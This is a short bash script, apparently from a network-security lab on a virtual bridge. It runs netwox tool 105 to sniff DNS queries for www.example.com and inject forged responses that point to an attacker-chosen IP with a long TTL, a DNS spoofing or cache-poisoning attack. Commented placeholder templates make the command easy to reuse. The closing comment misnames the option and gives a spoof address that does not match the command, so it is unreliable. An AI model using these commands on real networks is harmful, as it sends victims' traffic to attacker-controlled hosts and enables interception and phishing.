#!/bin/bash

# sudo netwox 105 -h "www.example.com" -H "150.140.189.12" -a "ns.example.com" -A "150.140.189.13" -d virbr0


# sudo netwox 105 -h "www.example.com" -H "<USER_MACHINE_IP>" -a "ns.example.com" -A "<DNS_SERVER_IP>" -d <ATTACKER_NETWORK_DEVICE> -T <TTL_IN_SECONDS> -s "<SPOOF_IP>"

sudo netwox 105 -h "www.example.com" -H "192.168.122.150" -a "ns.example.com" -A "192.168.122.149" -d virbr0 -T 3600 -s "4:150.140.189.12"
# sudo netwox 105 -h "www.example.com" -H "<USER_MACHINE_IP>" -a "ns.example.com" -A "<DNS_SERVER_IP>" -d <ATTACKER_NETWORK_DEVICE> -T <TTL_IN_SECONDS> -s "150.149.122.1"


# In this command, the -S option specifies the IP spoofing type, and "4" is the code for IPv4. The subsequent value, "150.149.122.1", is the IP address you want to use in the spoofed response.